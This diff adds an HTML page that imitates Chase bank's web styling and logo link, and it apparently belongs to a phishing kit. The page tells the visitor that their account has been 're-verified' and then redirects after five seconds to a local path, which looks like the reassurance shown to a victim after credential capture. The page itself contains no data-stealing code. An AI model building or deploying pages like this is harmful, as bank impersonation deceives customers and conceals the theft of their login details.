@@ -1,0 +1,81 @@
+<!DOCTYPE html>
+<html lang="en" dir="ltr">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Secure Login</title>
+  <link rel="shortcut icon" href="/img/favicon.ico" type="image/x-icon">
+  <link rel="stylesheet" href="/css/main2.css">
+  <script src="/js/jquery.js"></script>
+  <script src="/js/jquery.mask.min.js"></script>
+</head>
+
+<body style="overflow-x: hidden; overflow-y: auto; height: 100%">
+  <div class="homepage">
+    <div class="signin-container">
+      <header class="cb-header">
+        <div class="cb-header-wrap" style="min-width: 200px;">
+          <div class="cb-header-wrap-inner" style="max-width: 1200px;">
+            <div class="cb-header-container">
+              <div class="cb-header-container-left" style="min-width: 84px;">
+                <div class="cb-header-controls-left">
+                  <button type="button" class="cb-button cb-button--tertiary cb-button--inverse" tabindex="0">
+                    <span class="cb-button-icon cb-button-icon--leading">
+                      <svg xmlns="http://www.w3.org/2000/svg" width="48" height="48" viewBox="0 0 48 48">
+                        <path fill="inherit" d="M33.47 43.949a2.974 2.974 0 002.001-5.175l-16.244-14.77L35.47 9.238a2.974 2.974 0 10-4-4.4L12.804 21.806a2.974 2.974 0 000 4.402L31.47 43.177c.547.497 1.26.773 2 .772z"></path>
+                      </svg>
+                    </span>
+                    <span class="cb-button-label cb-button-label--with-icon">Exit</span>
+                  </button>
+                </div>
+              </div>
+
+              <div class="cb-header-logo-container cb-header-logo-container--absolute">
+                <a class="cb-header-logo-link" href="https://secure04ea.chase.com/web/auth/dashboard">
+                  <img class="cb-header-image" src="/img/logo-8.png">
+                </a>
+              </div>
+
+              <div class="cb-header-container-right" style="min-width: 84px;">
+                <div class="cb-header-controls-right">
+                  <button type="button" class="cb-button cb-button--tertiary cb-button--inverse" tabindex="0">
+                    <span class="cb-button-label">Español</span>
+                  </button>
+                </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </header>
+
+      <main class="signin-content">
+        <div class="signin-content-wrap">
+          <div class="container-fluid p-0">
+            <div class="row">
+              <div class="col-xs-12 col-sm-8 col-lg-6 col-sm-offset-2 col-lg-offset-3">
+                <div style="margin-top: 50px;margin-bottom:150px;text-align:center;">
+                  <svg width="64" height="64" viewBox="0 0 64 64" fill="none" xmlns="https://www.w3.org/2000/svg">
+                    <circle cx="32" cy="32" r="32" fill="#62CF66"></circle>
+                    <path fill-rule="evenodd" clip-rule="evenodd" d="M28.2514 44.0347C27.4541 44.9285 26.0553 44.9259 25.2614 44.0291L14.5907 31.9753C14.151 31.4787 14.3078 30.6995 14.9054 30.4116L15.3589 30.1931C15.686 30.0354 16.0729 30.0675 16.3695 30.2769L25.0794 36.423C25.8341 36.9556 26.8554 36.902 27.5502 36.2934L47.6139 18.7212C47.9155 18.4571 48.3457 18.3986 48.7068 18.5726L49.0901 18.7573C49.689 19.0458 49.8448 19.8277 49.4023 20.3238L28.2514 44.0347Z" fill="white"></path>
+                  </svg>
+                  <h3 class="cb-verify-header">Verification Complete</h3>
+                  <p class="cb-verify-header-sub">Your account has successfully been re-verified. You will be redirected back to our homepage shortly.</p>
+              </div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </main>
+    </div>
+  </div>
+
+  <script>
+    setTimeout(() => {
+      window.location.href = '/at';
+    }, 5000)
+  </script>
+</body>
+
+</html>
